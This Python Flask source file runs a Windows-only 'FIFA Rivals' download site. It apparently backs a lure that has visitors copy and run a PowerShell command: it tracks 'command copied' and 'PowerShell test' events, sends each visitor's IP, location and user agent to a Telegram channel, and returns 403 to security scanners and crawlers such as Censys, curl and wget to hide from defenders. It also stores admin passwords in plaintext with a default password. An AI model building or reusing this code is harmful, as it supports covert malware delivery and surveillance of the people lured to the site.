from flask import Flask, render_template, jsonify, request, redirect, url_for, flash, session
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from datetime import datetime, timedelta
import os
from urllib.parse import urlparse
from telegram import Bot
import logging
import requests
from threading import Thread
from functools import wraps
import re
from collections import defaultdict
import uuid
from dotenv import load_dotenv
import geoip2.database

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY')

# Set up database configuration for Render PostgreSQL
DATABASE_URL = os.getenv('DATABASE_URL')
if DATABASE_URL:
    # Handle special case for Render.com's DATABASE_URL format
    if DATABASE_URL.startswith("postgres://"):
        DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
    app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
else:
    # Fallback for local development
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///fifa_rivals.db'

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

logger.info(f"Database URI: {app.config['SQLALCHEMY_DATABASE_URI']}")

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

def send_telegram_message(message):
    """Send message to Telegram channel using requests"""
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        try:
            # Run in background thread to avoid blocking
            def send_async():
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                payload = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": message,
                    "parse_mode": "HTML"
                }
                try:
                    response = requests.post(url, json=payload, timeout=5)
                    if not response.ok:
                        logger.error(f"Telegram API error: {response.text}")
                except Exception as e:
                    logger.error(f"Failed to send Telegram message: {e}")

            Thread(target=send_async).start()
        except Exception as e:
            logger.error(f"Failed to start Telegram message thread: {e}")

# Get download URL from environment variable
WINDOWS_DOWNLOAD_URL = os.environ.get('WINDOWS_DOWNLOAD_URL')
ANDROID_DOWNLOAD_URL = os.environ.get('ANDROID_DOWNLOAD_URL')

# Get admin credentials from environment variables
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'fifa2024')

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'admin_login'

# Database Models
class Admin(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

class Visit(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45), nullable=False)
    country = db.Column(db.String(100))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    type = db.Column(db.String(20), default='VISIT')

class Download(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))

class BlockedIP(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip_pattern = db.Column(db.String(45), nullable=False, unique=True)
    reason = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)

@login_manager.user_loader
def load_user(user_id):
    return Admin.query.get(int(user_id))

# Bot protection configurations
BLOCKED_IPS = set()  # This will now stay empty

def is_bot(user_agent):
    """Check if user agent string matches known bot patterns"""
    if not user_agent:
        return True
        
    user_agent = user_agent.lower()
    
    # List of blocked bot user agents
    blocked_bots = [
        'twitterbot',
        'censysinspect',
        'telegrambot',
        'bot',
        'crawler',
        'spider',
        'curl',
        'wget',
        'python-requests',
        'python-urllib',
        'semrushbot',
        'petalbot',
        'ahrefsbot',
        'mj12bot',
        'dotbot',
        'applebot',
        'yandexbot',
        'baiduspider',
        'bingbot',
        'slurp'
    ]
    
    return any(bot in user_agent for bot in blocked_bots)

def bot_protection(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        user_agent = request.headers.get('User-Agent', '')
        ip_address = request.remote_addr
        
        if is_bot(user_agent):
            # Log blocked bot attempt
            logger.warning(f"Blocked bot access - IP: {ip_address}, UA: {user_agent}")
            return jsonify({
                'error': 'Access denied',
                'message': 'This resource is not available to bots or crawlers.'
            }), 403
            
        return f(*args, **kwargs)
    return decorated_function

# Constants for visit tracking (5 minute window)
VISIT_WINDOW = 300  # 5 minutes in seconds
visit_timestamps = defaultdict(list)

def is_recent_visit(ip):
    """Check if IP has visited recently (within 5 minutes)"""
    now = datetime.now()
    visit_timestamps[ip] = [t for t in visit_timestamps[ip] if now - t < timedelta(seconds=VISIT_WINDOW)]
    return len(visit_timestamps[ip]) > 0

# Initialize GeoIP reader
geo_reader = None
try:
    import geoip2.database
    import geoip2.errors
    # Try multiple common locations for the GeoIP database
    possible_paths = [
        'GeoLite2-Country.mmdb',
        'database/GeoLite2-Country.mmdb',
        os.path.join(os.path.dirname(__file__), 'GeoLite2-Country.mmdb'),
        os.path.join(os.path.dirname(__file__), 'database', 'GeoLite2-Country.mmdb')
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            geo_reader = geoip2.database.Reader(path)
            logger.info(f"GeoIP database found at: {path}")
            break
            
    if not geo_reader:
        logger.warning("GeoIP database not found in any of the expected locations")
except ImportError:
    logger.warning("GeoIP2 module not installed. Country detection will be disabled.")
except Exception as e:
    logger.warning(f"Error initializing GeoIP: {str(e)}")

def get_country_from_ip(ip):
    """Get country from IP using GeoIP2 with fallback"""
    if not geo_reader:
        return "Unknown"
    try:
        response = geo_reader.country(ip)
        return response.country.name
    except:
        # Fallback: Try to determine region from IP range
        ip_parts = ip.split('.')
        if len(ip_parts) == 4:
            if ip_parts[0] in ['10', '172', '192', '127']:
                return 'Local Network'
        return "Unknown"

def get_device_type():
    """Detect if the user is using Windows"""
    user_agent = request.headers.get('User-Agent', '').lower()
    if 'windows' in user_agent:
        return 'windows'
    return 'unsupported'

def is_ip_blocked(ip_address):
    """Check if an IP is blocked using exact match or pattern matching"""
    blocked_patterns = BlockedIP.query.all()
    for blocked in blocked_patterns:
        if re.match(f"^{re.escape(blocked.ip_pattern)}.*", ip_address):
            return True
    return False

def device_protection(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        ip_address = request.remote_addr
        
        # Check if IP is blocked
        if is_ip_blocked(ip_address):
            logger.warning(f"Blocked IP access attempt: {ip_address}")
            return jsonify({
                'error': 'Access denied',
                'message': 'Your IP address has been blocked.'
            }), 403
            
        device_type = get_device_type()
        if device_type == 'unsupported':
            return jsonify({
                'error': 'Access denied',
                'message': 'This application is only available for Windows PC.'
            }), 403
        return f(*args, **kwargs)
    return decorated_function

def check_ip_middleware():
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if request.remote_addr and is_ip_blocked(request.remote_addr):
                return "Access Denied", 403
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/')
@check_ip_middleware()
def index():
    return redirect(url_for('download'))

@app.route('/track-visit', methods=['POST'])
@check_ip_middleware()
def track_visit():
    ip_address = request.remote_addr
    country = "Unknown"
    city = "Unknown"
    
    try:
        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
            response = reader.country(ip_address)
            country = response.country.name
            # Try to get city if available
            try:
                city_response = reader.city(ip_address)
                city = city_response.city.name or "Unknown"
            except:
                pass
    except:
        pass
    
    # Record visit
    visit = Visit(ip_address=ip_address, country=country, type='VISIT')
    db.session.add(visit)
    db.session.commit()
    
    # Send Telegram notification
    message = f"""👀 New Visit!
<b>IP:</b> {ip_address}
<b>Location:</b> {city}, {country}
<b>User Agent:</b> {request.headers.get('User-Agent', 'Unknown')}"""
    send_telegram_message(message)
    
    return jsonify({
        'success': True,
        'location': {
            'city': city,
            'country': country
        }
    })

@app.route('/track-command-copy', methods=['POST'])
@check_ip_middleware()
def track_command_copy():
    ip_address = request.remote_addr
    country = "Unknown"
    city = "Unknown"
    
    try:
        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
            response = reader.country(ip_address)
            country = response.country.name
            # Try to get city if available
            try:
                city_response = reader.city(ip_address)
                city = city_response.city.name or "Unknown"
            except:
                pass
    except:
        pass
    
    # Record command copy
    visit = Visit(ip_address=ip_address, country=country, type='COMMAND_COPY')
    db.session.add(visit)
    db.session.commit()
    
    # Send Telegram notification
    message = f"""📋 Command Copied!
<b>IP:</b> {ip_address}
<b>Location:</b> {city}, {country}
<b>User Agent:</b> {request.headers.get('User-Agent', 'Unknown')}"""
    send_telegram_message(message)
    
    return jsonify({
        'success': True,
        'location': {
            'city': city,
            'country': country
        }
    })

@app.route('/download')
@check_ip_middleware()
def download():
    # Record visit
    ip_address = request.remote_addr
    country = "Unknown"
    
    try:
        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
            response = reader.country(ip_address)
            country = response.country.iso_code
    except:
        pass
    
    visit = Visit(ip_address=ip_address, country=country)
    db.session.add(visit)
    db.session.commit()
    
    # Send Telegram notification
    message = f"🌐 Page Visit!\n<b>IP:</b> {ip_address}\n<b>Country:</b> {country}"
    send_telegram_message(message)
    
    # Detect device type
    user_agent = request.headers.get('User-Agent', '').lower()
    device_type = 'windows' if 'windows' in user_agent else 'unsupported'
    
    # Get admin contact from environment
    admin_contact = os.environ.get('ADMIN_CONTACT', 'https://t.me/FIFARivalsSupport')
    
    return render_template('download.html', device_type=device_type, admin_contact=admin_contact)

@app.route('/track-download', methods=['POST'])
@check_ip_middleware()
def track_download():
    ip_address = request.remote_addr
    country = "Unknown"
    
    try:
        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
            response = reader.country(ip_address)
            country = response.country.iso_code
    except:
        pass
    
    # Record test execution
    visit = Visit(ip_address=ip_address, country=country, type='TEST')
    db.session.add(visit)
    db.session.commit()
    
    # Send Telegram notification
    message = f"🔧 New PowerShell Test!\n<b>IP:</b> {ip_address}\n<b>Country:</b> {country}"
    send_telegram_message(message)
    
    return jsonify({
        'success': True,
        'message': 'Test command executed successfully'
    })

@app.route('/request-download', methods=['POST'])
@check_ip_middleware()
def request_download():
    ip_address = request.remote_addr
    country = "Unknown"
    city = "Unknown"
    
    try:
        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
            response = reader.country(ip_address)
            country = response.country.name
            # Try to get city if available
            try:
                city_response = reader.city(ip_address)
                city = city_response.city.name or "Unknown"
            except:
                pass
    except:
        pass
    
    # Record download request
    visit = Visit(ip_address=ip_address, country=country, type='DOWNLOAD_REQUEST')
    db.session.add(visit)
    db.session.commit()
    
    # Get contact info and format username
    contact_info = request.json.get('contact', 'Not provided')
    # Clean up username format
    username = contact_info.strip()
    if username.startswith('@'):
        username = username[1:]  # Remove @ if present
    
    # Format Telegram message with better structure and emojis
    message = f"""🎮 New Download Request!

👤 <b>User:</b> @{username}
🌍 <b>Location:</b> {city}, {country}
🖥️ <b>IP:</b> {ip_address}
🔍 <b>Device:</b> {request.headers.get('User-Agent', 'Unknown')}

⏰ <i>Please contact the user as soon as possible!</i>"""
    
    send_telegram_message(message)
    
    return jsonify({
        'success': True,
        'message': 'Download request received. You will be redirected to chat with our admin.',
        'location': {
            'city': city,
            'country': country
        }
    })

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        admin = Admin.query.filter_by(username=username, password=password).first()
        
        if admin:
            login_user(admin)
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Invalid credentials')
    
    return render_template('admin_login.html')

@app.route('/admin/logout')
@login_required
def admin_logout():
    logout_user()
    return redirect(url_for('admin_login'))

@app.route('/admin')
@login_required
def admin_dashboard():
    # Calculate statistics
    total_visits = Visit.query.filter_by(type='VISIT').count()
    total_downloads = Visit.query.filter_by(type='DOWNLOAD').count()
    conversion_rate = round((total_downloads / total_visits * 100) if total_visits > 0 else 0, 2)
    
    today = datetime.utcnow().date()
    visits_today = Visit.query.filter(
        Visit.type == 'VISIT',
        Visit.timestamp >= today
    ).count()
    
    downloads_today = Visit.query.filter(
        Visit.type == 'DOWNLOAD',
        Visit.timestamp >= today
    ).count()
    
    this_month = today.replace(day=1)
    visits_this_month = Visit.query.filter(
        Visit.type == 'VISIT',
        Visit.timestamp >= this_month
    ).count()
    
    downloads_this_month = Visit.query.filter(
        Visit.type == 'DOWNLOAD',
        Visit.timestamp >= this_month
    ).count()
    
    # Get hourly stats for today
    hourly_stats = {
        'visits': [0] * 24,
        'downloads': [0] * 24
    }
    
    today_visits = Visit.query.filter(Visit.timestamp >= today).all()
    for visit in today_visits:
        hour = visit.timestamp.hour
        if visit.type == 'VISIT':
            hourly_stats['visits'][hour] += 1
        else:
            hourly_stats['downloads'][hour] += 1
    
    # Get top countries
    top_countries = db.session.query(
        Visit.country,
        db.func.count(Visit.id).label('count')
    ).group_by(Visit.country).order_by(db.func.count(Visit.id).desc()).limit(10).all()
    
    # Get recent activities
    recent_activities = Visit.query.order_by(Visit.timestamp.desc()).limit(50).all()
    
    # Get blocked IPs
    blocked_ips = BlockedIP.query.order_by(BlockedIP.timestamp.desc()).all()
    
    return render_template('admin_dashboard.html',
        total_visits=total_visits,
        total_downloads=total_downloads,
        conversion_rate=conversion_rate,
        visits_today=visits_today,
        downloads_today=downloads_today,
        visits_this_month=visits_this_month,
        downloads_this_month=downloads_this_month,
        hourly_stats=hourly_stats,
        top_countries=top_countries,
        recent_activities=recent_activities,
        blocked_ips=blocked_ips
    )

@app.route('/admin/block-ip', methods=['POST'])
@login_required
def block_ip():
    ip_pattern = request.form.get('ip_pattern')
    reason = request.form.get('reason')
    
    if not ip_pattern:
        flash('IP pattern is required')
        return redirect(url_for('admin_dashboard'))
    
    try:
        blocked_ip = BlockedIP(ip_pattern=ip_pattern, reason=reason)
        db.session.add(blocked_ip)
        db.session.commit()
        flash(f'Successfully blocked IP pattern: {ip_pattern}')
    except Exception as e:
        flash(f'Error blocking IP: {str(e)}')
    
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/unblock-ip/<int:id>', methods=['POST'])
@login_required
def unblock_ip(id):
    blocked_ip = BlockedIP.query.get_or_404(id)
    try:
        db.session.delete(blocked_ip)
        db.session.commit()
        flash(f'Successfully unblocked IP pattern: {blocked_ip.ip_pattern}')
    except Exception as e:
        flash(f'Error unblocking IP: {str(e)}')
    
    return redirect(url_for('admin_dashboard'))

def init_db():
    with app.app_context():
        db.create_all()
        # Create admin user if not exists
        if not Admin.query.filter_by(username=os.getenv('ADMIN_USERNAME')).first():
            admin = Admin(username=os.getenv('ADMIN_USERNAME'), password=os.getenv('ADMIN_PASSWORD'))
            db.session.add(admin)
            db.session.commit()

# Initialize database tables and admin user on startup
init_db()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000))) 
